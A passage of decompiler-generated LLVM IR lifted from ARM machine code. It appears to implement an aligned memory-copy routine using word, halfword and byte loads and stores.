  br i1 %v2_15180, label %dec_label_pc_1517c.dec_label_pc_1517c_crit_edge, label %dec_label_pc_1518c

dec_label_pc_1517c.dec_label_pc_1517c_crit_edge:  ; preds = %dec_label_pc_1517c
  %v0_15180.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1517c

dec_label_pc_1518c:                               ; preds = %dec_label_pc_1517c
  %v6_15180 = icmp slt i32 %v1_15180, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_15180, i1* %cpsr_n.global-to-local, align 1
  %v0_1518c = load i32, i32* %r2.global-to-local, align 4
  %v1_1518c = add i32 %v0_1518c, 32
  store i32 %v1_1518c, i32* @r2, align 4
  br label %dec_label_pc_15190

dec_label_pc_15190:                               ; preds = %dec_label_pc_15174, %dec_label_pc_1518c
  %v1_151a4 = phi i32 [ %v0_1518464, %dec_label_pc_15174 ], [ %v24_15184, %dec_label_pc_1518c ]
  %v0_15198 = phi i32 [ %v1_15174, %dec_label_pc_15174 ], [ %v1_1518c, %dec_label_pc_1518c ]
  %v1_15190 = urem i32 %v0_15198, 32
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15190 = icmp eq i32 %v1_15190, 0
  br i1 %v2_15190, label %.thread4, label %dec_label_pc_15198

dec_label_pc_15198:                               ; preds = %dec_label_pc_15190
  %v1_15198 = and i32 %v0_15198, 16
  %v2_15198 = icmp ne i32 %v1_15198, 0
  store i1 %v2_15198, i1* %cpsr_c.global-to-local, align 1
  %v3_15198 = mul i32 %v0_15198, 268435456
  store i32 %v3_15198, i32* %ip.global-to-local, align 4
  %v4_15198 = icmp slt i32 %v3_15198, 0
  store i1 %v4_15198, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_15198, label %bb140, label %bb141

bb140:                                            ; preds = %dec_label_pc_15198
  %v1_1519c = load i32, i32* %r1.global-to-local, align 4
  %v2_1519c = inttoptr i32 %v1_1519c to i32*
  %v3_1519c = load i32, i32* %v2_1519c, align 4
  store i32 %v3_1519c, i32* @r4, align 4
  %v4_1519c = add i32 %v1_1519c, 4
  %v5_1519c = inttoptr i32 %v4_1519c to i32*
  %v6_1519c = load i32, i32* %v5_1519c, align 4
  store i32 %v6_1519c, i32* @r5, align 4
  %v7_1519c = add i32 %v1_1519c, 8
  %v8_1519c = inttoptr i32 %v7_1519c to i32*
  %v9_1519c = load i32, i32* %v8_1519c, align 4
  store i32 %v9_1519c, i32* @r6, align 4
  %v10_1519c = add i32 %v1_1519c, 12
  %v11_1519c = inttoptr i32 %v10_1519c to i32*
  %v12_1519c = load i32, i32* %v11_1519c, align 4
  store i32 %v12_1519c, i32* @r7, align 4
  %v13_1519c = add i32 %v1_1519c, 16
  store i32 %v13_1519c, i32* %r1.global-to-local, align 4
  br i1 %v4_15198, label %bb142, label %.thread94

bb141:                                            ; preds = %dec_label_pc_15198
  br i1 %v4_15198, label %._crit_edge, label %.thread98

._crit_edge:                                      ; preds = %bb141
  %v1_151a0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140, %._crit_edge
  %v1_151a0 = phi i32 [ %v1_151a0.pre, %._crit_edge ], [ %v13_1519c, %bb140 ]
  %v2_151a0 = inttoptr i32 %v1_151a0 to i32*
  %v3_151a0 = load i32, i32* %v2_151a0, align 4
  store i32 %v3_151a0, i32* @r8, align 4
  %v4_151a0 = add i32 %v1_151a0, 4
  %v5_151a0 = inttoptr i32 %v4_151a0 to i32*
  %v6_151a0 = load i32, i32* %v5_151a0, align 4
  store i32 %v6_151a0, i32* @sb, align 4
  %v7_151a0 = add i32 %v1_151a0, 8
  store i32 %v7_151a0, i32* %r1.global-to-local, align 4
  br i1 %v2_15198, label %bb142..thread94_crit_edge, label %.thread96

bb142..thread94_crit_edge:                        ; preds = %bb142
  %v3_151a4.pre = load i32, i32* @r4, align 4
  br label %.thread94

.thread94:                                        ; preds = %bb142..thread94_crit_edge, %bb140
  %v3_151a4 = phi i32 [ %v3_151a4.pre, %bb142..thread94_crit_edge ], [ %v3_1519c, %bb140 ]
  %v2_151a4 = inttoptr i32 %v1_151a4 to i32*
  store i32 %v3_151a4, i32* %v2_151a4, align 4
  %v4_151a4 = add i32 %v1_151a4, 4
  %v5_151a4 = inttoptr i32 %v4_151a4 to i32*
  %v6_151a4 = load i32, i32* @r5, align 4
  store i32 %v6_151a4, i32* %v5_151a4, align 4
  %v7_151a4 = add i32 %v1_151a4, 8
  %v8_151a4 = inttoptr i32 %v7_151a4 to i32*
  %v9_151a4 = load i32, i32* @r6, align 4
  store i32 %v9_151a4, i32* %v8_151a4, align 4
  %v10_151a4 = add i32 %v1_151a4, 12
  %v11_151a4 = inttoptr i32 %v10_151a4 to i32*
  %v12_151a4 = load i32, i32* @r7, align 4
  store i32 %v12_151a4, i32* %v11_151a4, align 4
  %v13_151a4 = add i32 %v1_151a4, 16
  store i32 %v13_151a4, i32* %r0.global-to-local, align 4
  br i1 %v4_15198, label %.thread94..thread96_crit_edge, label %.thread98

.thread94..thread96_crit_edge:                    ; preds = %.thread94
  %v3_151a8.pre = load i32, i32* @r8, align 4
  br label %.thread96

.thread96:                                        ; preds = %.thread94..thread96_crit_edge, %bb142
  %v3_151a8 = phi i32 [ %v3_151a8.pre, %.thread94..thread96_crit_edge ], [ %v3_151a0, %bb142 ]
  %v1_151a897 = phi i32 [ %v13_151a4, %.thread94..thread96_crit_edge ], [ %v1_151a4, %bb142 ]
  %v2_151a8 = inttoptr i32 %v1_151a897 to i32*
  store i32 %v3_151a8, i32* %v2_151a8, align 4
  %v4_151a8 = add i32 %v1_151a897, 4
  %v5_151a8 = inttoptr i32 %v4_151a8 to i32*
  %v6_151a8 = load i32, i32* @sb, align 4
  store i32 %v6_151a8, i32* %v5_151a8, align 4
  %v7_151a8 = add i32 %v1_151a897, 8
  store i32 %v7_151a8, i32* %r0.global-to-local, align 4
  br label %.thread98

.thread98:                                        ; preds = %bb141, %.thread94, %.thread96
  %v2_151b8 = phi i32 [ %v13_151a4, %.thread94 ], [ %v7_151a8, %.thread96 ], [ %v1_151a4, %bb141 ]
  %v0_151ac = load i32, i32* @r2, align 4
  %v1_151ac = and i32 %v0_151ac, 4
  %v2_151ac = icmp ne i32 %v1_151ac, 0
  store i1 %v2_151ac, i1* %cpsr_c.global-to-local, align 1
  %v3_151ac = mul i32 %v0_151ac, 1073741824
  store i32 %v3_151ac, i32* @ip, align 4
  %v4_151ac = icmp slt i32 %v3_151ac, 0
  store i1 %v4_151ac, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_151ac, label %bb143, label %bb144

bb143:                                            ; preds = %.thread98
  %v1_151b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_151b0 = inttoptr i32 %v1_151b0 to i32*
  %v3_151b0 = load i32, i32* %v2_151b0, align 4
  store i32 %v3_151b0, i32* @r3, align 4
  %v5_151b0 = add i32 %v1_151b0, 4
  store i32 %v5_151b0, i32* %r1.global-to-local, align 4
  br i1 %v4_151ac, label %.thread109, label %bb145

.thread109:                                       ; preds = %bb143
  %v2_151b4102 = inttoptr i32 %v5_151b0 to i16*
  %v3_151b4103 = load i16, i16* %v2_151b4102, align 2
  %v4_151b4104 = zext i16 %v3_151b4103 to i32
  store i32 %v4_151b4104, i32* %r4.global-to-local, align 4
  %v6_151b4105 = add i32 %v1_151b0, 2
  store i32 %v6_151b4105, i32* %r1.global-to-local, align 4
  %v3_151b8111 = inttoptr i32 %v2_151b8 to i32*
  store i32 %v3_151b0, i32* %v3_151b8111, align 4
  %v4_151b8112 = load i32, i32* %r0.global-to-local, align 4
  %v5_151b8113 = add i32 %v4_151b8112, 4
  store i32 %v5_151b8113, i32* %r0.global-to-local, align 4
  %v1_151bc.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t196 = trunc i32 %v1_151bc.pre to i16
  br label %bb146

bb144:                                            ; preds = %.thread98
  br i1 %v4_151ac, label %.thread106, label %.thread108

.thread106:                                       ; preds = %bb144
  %v1_151b4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_151b4 = inttoptr i32 %v1_151b4.pre to i16*
  %v3_151b4 = load i16, i16* %v2_151b4, align 2
  %v4_151b4 = zext i16 %v3_151b4 to i32
  store i32 %v4_151b4, i32* %r4.global-to-local, align 4
  %v6_151b4 = add i32 %v1_151b4.pre, -2
  store i32 %v6_151b4, i32* %r1.global-to-local, align 4
  br label %bb146

bb145:                                            ; preds = %bb143
  %v3_151b8 = inttoptr i32 %v2_151b8 to i32*
  store i32 %v3_151b0, i32* %v3_151b8, align 4
  %v4_151b8 = load i32, i32* %r0.global-to-local, align 4
  %v5_151b8 = add i32 %v4_151b8, 4
  store i32 %v5_151b8, i32* %r0.global-to-local, align 4
  br label %.thread108

bb146:                                            ; preds = %.thread109, %.thread106
  %v1_151bc.off0 = phi i16 [ %v3_151b4, %.thread106 ], [ %extract.t196, %.thread109 ]
  %v3_151bc107 = phi i32 [ %v2_151b8, %.thread106 ], [ %v5_151b8113, %.thread109 ]
  %v4_151bc = inttoptr i32 %v3_151bc107 to i16*
  store i16 %v1_151bc.off0, i16* %v4_151bc, align 2
  %v5_151bc = load i32, i32* %r0.global-to-local, align 4
  %v6_151bc = add i32 %v5_151bc, -2
  store i32 %v6_151bc, i32* %r0.global-to-local, align 4
  br label %.thread108

.thread108:                                       ; preds = %bb144, %bb145, %bb146
  %v3_151c8 = phi i32 [ %v5_151b8, %bb145 ], [ %v6_151bc, %bb146 ], [ %v2_151b8, %bb144 ]
  %v0_151c0 = load i32, i32* @r2, align 4
  %v1_151c0 = urem i32 %v0_151c0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_151c0 = icmp eq i32 %v1_151c0, 0
  br i1 %v2_151c0, label %.thread4, label %bb147

bb147:                                            ; preds = %.thread108
  %v1_151c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_151c4 = inttoptr i32 %v1_151c4 to i8*
  %v3_151c4 = load i8, i8* %v2_151c4, align 1
  %v4_151c4 = zext i8 %v3_151c4 to i32
  store i32 %v4_151c4, i32* @r3, align 4
  %v4_151c8 = inttoptr i32 %v3_151c8 to i8*
  store i8 %v3_151c4, i8* %v4_151c8, align 1
  br label %.thread4

.thread4:                                         ; preds = %.thread108, %dec_label_pc_15190, %bb147
  %v2_151cc = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_151cc, i32* @r5, align 4
  store i32 %v5_15138, i32* @r6, align 4
  store i32 %v8_15138, i32* @r7, align 4
  store i32 %v11_15138, i32* @r8, align 4
  store i32 %v14_15138, i32* @sb, align 4
  store i32 %v17_15138, i32* @sl, align 4
  store i32 %v20_15138, i32* @fp, align 4
  store i32 %v3_150f0, i32* %r0.global-to-local, align 4
  store i32 %v8_150f0, i32* @r4, align 4
  store i32 %v11_150f0, i32* @lr, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  ret i32 %v3_150f0

dec_label_pc_151e0:                               ; preds = %.thread2
  %v0_151e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_151e0 = add i32 %v0_151e0, -4
  %v2_151e0 = icmp ugt i32 %v0_151e0, 3
  store i1 %v2_151e0, i1* %cpsr_c.global-to-local, align 1
  %v6_151e0 = icmp slt i32 %v1_151e0, 0
  store i1 %v6_151e0, i1* %cpsr_n.global-to-local, align 1
  %v3_151e4 = icmp ult i32 %v0_151e0, 2
  br i1 %v3_151e4, label %dec_label_pc_153cc, label %dec_label_pc_151e8

dec_label_pc_151e8:                               ; preds = %dec_label_pc_151e0
  %v2_151e8 = load i32, i32* @r5, align 4
  store i32 %v2_151e8, i32* %stack_var_-40, align 4
  %v5_151e8 = load i32, i32* @r6, align 4
  %v8_151e8 = load i32, i32* @r7, align 4
  %v11_151e8 = load i32, i32* @r8, align 4
  %v14_151e8 = load i32, i32* @sb, align 4
  %v17_151e8 = load i32, i32* @sl, align 4
  %v20_151e8 = load i32, i32* @fp, align 4
  %v1_151ec = sub i32 0, %v1_1515c
  %v1_151f0 = urem i32 %v1_151ec, 4
  store i32 %v1_151f0, i32* %r5.global-to-local, align 4
  %v3_151f4 = mul nuw nsw i32 %v1_151f0, 8
  store i32 %v3_151f4, i32* @ip, align 4
  %v1_151f8 = sub nsw i32 32, %v3_151f4
  store i32 %v1_151f8, i32* %lr.global-to-local, align 4
  %v1_151fc = inttoptr i32 %v1_1512c to i32*
  %v2_151fc = load i32, i32* %v1_151fc, align 4
  store i32 %v2_151fc, i32* @r3, align 4
  %v4_151fc = add i32 %v1_1512c, 4
  store i32 %v4_151fc, i32* %r1.global-to-local, align 4
  store i32 %v1_151e0, i32* %r2.global-to-local, align 4
  %v1_15204 = and i32 %v1_151ec, 2
  %v2_15204 = icmp ne i32 %v1_15204, 0
  store i1 %v2_15204, i1* %cpsr_c.global-to-local, align 1
  %v3_15204 = shl i32 %v1_151ec, 31
  store i32 %v3_15204, i32* %r5.global-to-local, align 4
  %v4_15204 = icmp ne i32 %v3_15204, 0
  store i1 %v4_15204, i1* %cpsr_n.global-to-local, align 1
  %v2_15208 = trunc i32 %v2_151fc to i8
  br i1 %v4_15204, label %bb148, label %thread-pre-split

bb148:                                            ; preds = %dec_label_pc_151e8
  %v4_15208 = inttoptr i32 %v1_1515c to i8*
  store i8 %v2_15208, i8* %v4_15208, align 1
  %v5_15208 = load i32, i32* %r0.global-to-local, align 4
  %v6_15208 = add i32 %v5_15208, 1
  store i32 %v6_15208, i32* %r0.global-to-local, align 4
  %v0_1520c.pr = load i1, i1* %cpsr_n.global-to-local, align 1
  br i1 %v0_1520c.pr, label %bb149, label %.thread-pre-split_crit_edge

.thread-pre-split_crit_edge:                      ; preds = %bb148
  %v0_15210.pr.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15210.pr.pre, label %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge, label %.thread10

.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge: ; preds = %.thread-pre-split_crit_edge
  %v1_15210.pre.pre = load i32, i32* @r3, align 4
  %extract.t193 = trunc i32 %v1_15210.pre.pre to i8
  br label %bb150

thread-pre-split:                                 ; preds = %dec_label_pc_151e8
  br i1 %v2_15204, label %bb150, label %.thread10

bb149:                                            ; preds = %bb148
  %v1_1520c = load i32, i32* @r3, align 4
  %v2_1520c = and i32 %v1_1520c, 128
  %v3_1520c = icmp ne i32 %v2_1520c, 0
  store i1 %v3_1520c, i1* %cpsr_c.global-to-local, align 1
  %v4_1520c = udiv i32 %v1_1520c, 256
  store i32 %v4_1520c, i32* @r3, align 4
  %extract.t87 = trunc i32 %v4_1520c to i8
  br i1 %v3_1520c, label %bb150, label %.thread10

bb150:                                            ; preds = %thread-pre-split, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge, %bb149
  %v3_15210 = phi i32 [ %v6_15208, %bb149 ], [ %v6_15208, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge ], [ %v1_1515c, %thread-pre-split ]
  %v1_15210.off0 = phi i8 [ %extract.t87, %bb149 ], [ %extract.t193, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge ], [ %v2_15208, %thread-pre-split ]
  %v4_15210 = inttoptr i32 %v3_15210 to i8*
  store i8 %v1_15210.off0, i8* %v4_15210, align 1
  %v5_15210 = load i32, i32* %r0.global-to-local, align 4
  %v6_15210 = add i32 %v5_15210, 1
  store i32 %v6_15210, i32* %r0.global-to-local, align 4
  %v0_15214.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15214.pr, label %bb151, label %.thread10

bb151:                                            ; preds = %bb150
  %v1_15214 = load i32, i32* @r3, align 4
  %v2_15214 = and i32 %v1_15214, 128
  %v3_15214 = icmp ne i32 %v2_15214, 0
  store i1 %v3_15214, i1* %cpsr_c.global-to-local, align 1
  %v4_15214 = udiv i32 %v1_15214, 256
  store i32 %v4_15214, i32* @r3, align 4
  br i1 %v3_15214, label %.thread7, label %.thread10

.thread7:                                         ; preds = %bb151
  %v2_15218 = trunc i32 %v4_15214 to i8
  %v4_15218 = inttoptr i32 %v6_15210 to i8*
  store i8 %v2_15218, i8* %v4_15218, align 1
  %v5_15218 = load i32, i32* %r0.global-to-local, align 4
  %v6_15218 = add i32 %v5_15218, 1
  store i32 %v6_15218, i32* %r0.global-to-local, align 4
  %v0_1521c.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1521c.pr.pr, label %bb152, label %.thread10

bb152:                                            ; preds = %.thread7
  %v1_1521c = load i32, i32* @r3, align 4
  %v2_1521c = and i32 %v1_1521c, 128
  %v3_1521c = icmp ne i32 %v2_1521c, 0
  store i1 %v3_1521c, i1* %cpsr_c.global-to-local, align 1
  %v4_1521c = udiv i32 %v1_1521c, 256
  store i32 %v4_1521c, i32* @r3, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread-pre-split_crit_edge, %bb150, %bb149, %thread-pre-split, %bb151, %.thread7, %bb152
  %v0_1522831 = phi i32 [ %v6_15210, %bb150 ], [ %v6_15208, %bb149 ], [ %v1_1515c, %thread-pre-split ], [ %v6_15210, %bb151 ], [ %v6_15218, %.thread7 ], [ %v6_15218, %bb152 ], [ %v6_15208, %.thread-pre-split_crit_edge ]
  %v0_15220 = load i32, i32* %r2.global-to-local, align 4
  %v1_15220 = add i32 %v0_15220, -4
  %v2_15220 = icmp ugt i32 %v0_15220, 3
  store i1 %v2_15220, i1* %cpsr_c.global-to-local, align 1
  %v6_15220 = icmp slt i32 %v1_15220, 0
  store i1 %v6_15220, i1* %cpsr_n.global-to-local, align 1
  %v3_15224 = icmp ult i32 %v0_15220, 2
  br i1 %v3_15224, label %dec_label_pc_153b0, label %dec_label_pc_15228

dec_label_pc_15228:                               ; preds = %.thread10, %dec_label_pc_15230
  %v0_15234 = phi i32 [ %v0_15244, %dec_label_pc_15230 ], [ %v0_15220, %.thread10 ]
  %v1_15240 = phi i32 [ %v4_15240, %dec_label_pc_15230 ], [ %v0_1522831, %.thread10 ]
  %v1_15228 = and i32 %v1_15240, 28
  %v2_15228 = icmp eq i32 %v1_15228, 0
  br i1 %v2_15228, label %dec_label_pc_15250.loopexit, label %dec_label_pc_15230

dec_label_pc_15230:                               ; preds = %dec_label_pc_15228
  %v0_15230 = load i32, i32* %r1.global-to-local, align 4
  %v1_15230 = inttoptr i32 %v0_15230 to i32*
  %v2_15230 = load i32, i32* %v1_15230, align 4
  store i32 %v2_15230, i32* %r5.global-to-local, align 4
  %v4_15230 = add i32 %v0_15230, 4
  store i32 %v4_15230, i32* %r1.global-to-local, align 4
  %v1_15234 = add i32 %v0_15234, -4
  store i32 %v1_15234, i32* %r2.global-to-local, align 4
  %v0_15238 = load i32, i32* @r3, align 4
  %v2_15238 = load i32, i32* %lr.global-to-local, align 4
  %v7_15238 = shl i32 %v2_15230, %v2_15238
  %v8_15238 = or i32 %v7_15238, %v0_15238
  store i32 %v8_15238, i32* %r4.global-to-local, align 4
  %v1_1523c = load i32, i32* @ip, align 4
  %v6_1523c = lshr i32 %v2_15230, %v1_1523c
  store i32 %v6_1523c, i32* @r3, align 4
  %v2_15240 = inttoptr i32 %v1_15240 to i32*
  store i32 %v8_15238, i32* %v2_15240, align 4
  %v3_15240 = load i32, i32* %r0.global-to-local, align 4
  %v4_15240 = add i32 %v3_15240, 4
  store i32 %v4_15240, i32* %r0.global-to-local, align 4
  %v0_15244 = load i32, i32* %r2.global-to-local, align 4
  %v2_15244 = icmp ugt i32 %v0_15244, 3
  store i1 %v2_15244, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_15244, label %dec_label_pc_15228, label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %dec_label_pc_15230
  %v1_15244 = add i32 %v0_15244, -4
  %v6_15244 = icmp slt i32 %v1_15244, 0
  store i1 %v6_15244, i1* %cpsr_n.global-to-local, align 1
  %v3_1524c = icmp ult i32 %v0_15244, 2
  br i1 %v3_1524c, label %dec_label_pc_153b0, label %dec_label_pc_15250

dec_label_pc_15250.loopexit:                      ; preds = %dec_label_pc_15228
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15250

dec_label_pc_15250:                               ; preds = %dec_label_pc_15250.loopexit, %dec_label_pc_1524c
  %v0_152b838 = phi i32 [ %v1_15240, %dec_label_pc_15250.loopexit ], [ %v4_15240, %dec_label_pc_1524c ]
  %v0_15250 = phi i32 [ %v0_15234, %dec_label_pc_15250.loopexit ], [ %v0_15244, %dec_label_pc_1524c ]
  %v1_15250 = add i32 %v0_15250, -32
  store i32 %v1_15250, i32* %r2.global-to-local, align 4
  %v2_15250 = icmp ugt i32 %v0_15250, 31
  store i1 %v2_15250, i1* %cpsr_c.global-to-local, align 1
  %v6_15250 = icmp slt i32 %v1_15250, 0
  store i1 %v6_15250, i1* %cpsr_n.global-to-local, align 1
  %v3_15254 = icmp ult i32 %v1_15250, 30
  br i1 %v3_15254, label %dec_label_pc_15384, label %dec_label_pc_15258

dec_label_pc_15258:                               ; preds = %dec_label_pc_15250
  %v0_15258 = load i32, i32* @ip, align 4
  %v1_15258 = add i32 %v0_15258, -24
  %v2_15258 = icmp ugt i32 %v0_15258, 23
  store i1 %v2_15258, i1* %cpsr_c.global-to-local, align 1
  %v6_15258 = icmp slt i32 %v1_15258, 0
  store i1 %v6_15258, i1* %cpsr_n.global-to-local, align 1
  %v7_15258 = icmp eq i32 %v0_15258, 24
  br i1 %v7_15258, label %dec_label_pc_15328, label %dec_label_pc_15260

dec_label_pc_15260:                               ; preds = %dec_label_pc_15258
  %v1_15260 = add i32 %v0_15258, -8
  %v2_15260 = icmp ugt i32 %v0_15258, 7
  store i1 %v2_15260, i1* %cpsr_c.global-to-local, align 1
  %v6_15260 = icmp slt i32 %v1_15260, 0
  store i1 %v6_15260, i1* %cpsr_n.global-to-local, align 1
  %v7_15260 = icmp eq i32 %v0_15258, 8
  %v0_152c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_152c8 = inttoptr i32 %v0_152c8 to i32*
  %v2_152c8 = load i32, i32* %v1_152c8, align 4
  store i32 %v2_152c8, i32* %ip.global-to-local, align 4
  %v4_152c8 = add i32 %v0_152c8, 4
  store i32 %v4_152c8, i32* %r1.global-to-local, align 4
  br i1 %v7_15260, label %dec_label_pc_152cc, label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %dec_label_pc_15260, %.dec_label_pc_1526c_crit_edge
  %v0_152b8 = phi i32 [ %v24_152b8, %.dec_label_pc_1526c_crit_edge ], [ %v0_152b838, %dec_label_pc_15260 ]
  %v0_15274 = phi i32 [ %v0_15274.pre, %.dec_label_pc_1526c_crit_edge ], [ %v1_15250, %dec_label_pc_15260 ]
  %v0_15270 = phi i32 [ %v0_15270.pre, %.dec_label_pc_1526c_crit_edge ], [ %v4_152c8, %dec_label_pc_15260 ]
  %v1_1527c = phi i32 [ %v0_1526c.pre, %.dec_label_pc_1526c_crit_edge ], [ %v2_152c8, %dec_label_pc_15260 ]
  store i32 %v1_1527c, i32* %r4.global-to-local, align 4
  %v1_15270 = inttoptr i32 %v0_15270 to i32*
  %v2_15270 = load i32, i32* %v1_15270, align 4
  store i32 %v2_15270, i32* %r5.global-to-local, align 4
  %v3_15270 = add i32 %v0_15270, 4
  %v4_15270 = inttoptr i32 %v3_15270 to i32*
  %v5_15270 = load i32, i32* %v4_15270, align 4
  store i32 %v5_15270, i32* %r6.global-to-local, align 4
  %v6_15270 = add i32 %v0_15270, 8
  %v7_15270 = inttoptr i32 %v6_15270 to i32*
  %v8_15270 = load i32, i32* %v7_15270, align 4
  store i32 %v8_15270, i32* %r7.global-to-local, align 4
  %v9_15270 = add i32 %v0_15270, 12
  %v10_15270 = inttoptr i32 %v9_15270 to i32*
  %v11_15270 = load i32, i32* %v10_15270, align 4
  store i32 %v11_15270, i32* %r8.global-to-local, align 4
  %v12_15270 = add i32 %v0_15270, 16
  %v13_15270 = inttoptr i32 %v12_15270 to i32*
  %v14_15270 = load i32, i32* %v13_15270, align 4
  store i32 %v14_15270, i32* %sb.global-to-local, align 4
  %v15_15270 = add i32 %v0_15270, 20
  %v16_15270 = inttoptr i32 %v15_15270 to i32*
  %v17_15270 = load i32, i32* %v16_15270, align 4
  store i32 %v17_15270, i32* %sl.global-to-local, align 4
  %v18_15270 = add i32 %v0_15270, 24
  %v19_15270 = inttoptr i32 %v18_15270 to i32*
  %v20_15270 = load i32, i32* %v19_15270, align 4
  store i32 %v20_15270, i32* %fp.global-to-local, align 4
  %v21_15270 = add i32 %v0_15270, 28
  store i32 %v21_15270, i32* %r1.global-to-local, align 4
  %v1_15274 = add i32 %v0_15274, -32
  store i32 %v1_15274, i32* %r2.global-to-local, align 4
  %v2_15274 = icmp ugt i32 %v0_15274, 31
  br i1 %v2_15274, label %bb153, label %bb154

bb153:                                            ; preds = %dec_label_pc_1526c
  %v2_15278 = inttoptr i32 %v21_15270 to i32*
  %v3_15278 = load i32, i32* %v2_15278, align 4
  store i32 %v3_15278, i32* %ip.global-to-local, align 4
  %v5_15278 = add i32 %v0_15270, 32
  store i32 %v5_15278, i32* %r1.global-to-local, align 4
  br label %bb154

bb154:                                            ; preds = %dec_label_pc_1526c, %bb153
  %v0_1527c = load i32, i32* @r3, align 4
  %v4_1527c = mul i32 %v1_1527c, 65536
  %v5_1527c = or i32 %v0_1527c, %v4_1527c
  %v3_15280 = udiv i32 %v1_1527c, 65536
  %v4_15284 = mul i32 %v2_15270, 65536
  %v5_15284 = or i32 %v4_15284, %v3_15280
  store i32 %v5_15284, i32* %r4.global-to-local, align 4
  %v3_15288 = udiv i32 %v2_15270, 65536
  %v4_1528c = mul i32 %v5_15270, 65536
  %v5_1528c = or i32 %v4_1528c, %v3_15288
  store i32 %v5_1528c, i32* %r5.global-to-local, align 4
  %v3_15290 = udiv i32 %v5_15270, 65536
  %v4_15294 = mul i32 %v8_15270, 65536
  %v5_15294 = or i32 %v4_15294, %v3_15290
  store i32 %v5_15294, i32* %r6.global-to-local, align 4
  %v3_15298 = udiv i32 %v8_15270, 65536
  %v4_1529c = mul i32 %v11_15270, 65536
  %v5_1529c = or i32 %v4_1529c, %v3_15298
  store i32 %v5_1529c, i32* %r7.global-to-local, align 4
  %v3_152a0 = udiv i32 %v11_15270, 65536
  %v4_152a4 = mul i32 %v14_15270, 65536
  %v5_152a4 = or i32 %v4_152a4, %v3_152a0
  store i32 %v5_152a4, i32* %r8.global-to-local, align 4
  %v3_152a8 = udiv i32 %v14_15270, 65536
  %v4_152ac = mul i32 %v17_15270, 65536
  %v5_152ac = or i32 %v4_152ac, %v3_152a8
  store i32 %v5_152ac, i32* %sb.global-to-local, align 4
  %v3_152b0 = udiv i32 %v17_15270, 65536
  %v4_152b4 = mul i32 %v20_15270, 65536
  %v5_152b4 = or i32 %v4_152b4, %v3_152b0
  store i32 %v5_152b4, i32* %sl.global-to-local, align 4
  %v1_152b8 = inttoptr i32 %v0_152b8 to i32*
  store i32 %v5_1527c, i32* %v1_152b8, align 4
  %v3_152b8 = add i32 %v0_152b8, 4
  %v4_152b8 = inttoptr i32 %v3_152b8 to i32*
  %v5_152b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_152b8, i32* %v4_152b8, align 4
  %v6_152b8 = add i32 %v0_152b8, 8
  %v7_152b8 = inttoptr i32 %v6_152b8 to i32*
  %v8_152b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_152b8, i32* %v7_152b8, align 4
  %v9_152b8 = add i32 %v0_152b8, 12
  %v10_152b8 = inttoptr i32 %v9_152b8 to i32*
  %v11_152b8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_152b8, i32* %v10_152b8, align 4
  %v12_152b8 = add i32 %v0_152b8, 16
  %v13_152b8 = inttoptr i32 %v12_152b8 to i32*
  %v14_152b8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_152b8, i32* %v13_152b8, align 4
  %v15_152b8 = add i32 %v0_152b8, 20
  %v16_152b8 = inttoptr i32 %v15_152b8 to i32*
  %v17_152b8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_152b8, i32* %v16_152b8, align 4
  %v18_152b8 = add i32 %v0_152b8, 24
  %v19_152b8 = inttoptr i32 %v18_152b8 to i32*
  %v20_152b8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_152b8, i32* %v19_152b8, align 4
  %v21_152b8 = add i32 %v0_152b8, 28
  %v22_152b8 = inttoptr i32 %v21_152b8 to i32*
  %v23_152b8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_152b8, i32* %v22_152b8, align 4
  %v24_152b8 = add i32 %v0_152b8, 32
  store i32 %v24_152b8, i32* %r0.global-to-local, align 4
  %v0_152bc = load i32, i32* %fp.global-to-local, align 4
  %v1_152bc = and i32 %v0_152bc, 32768
  %v2_152bc = icmp eq i32 %v1_152bc, 0
  %v3_152bc = udiv i32 %v0_152bc, 65536
  store i32 %v3_152bc, i32* @r3, align 4
  br i1 %v2_152bc, label %dec_label_pc_15384.loopexit19, label %.dec_label_pc_1526c_crit_edge

.dec_label_pc_1526c_crit_edge:                    ; preds = %bb154
  %v0_1526c.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_15270.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_15274.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1526c

dec_label_pc_152cc:                               ; preds = %dec_label_pc_15260, %.dec_label_pc_152cc_crit_edge
  %v0_15318 = phi i32 [ %v24_15318, %.dec_label_pc_152cc_crit_edge ], [ %v0_152b838, %dec_label_pc_15260 ]
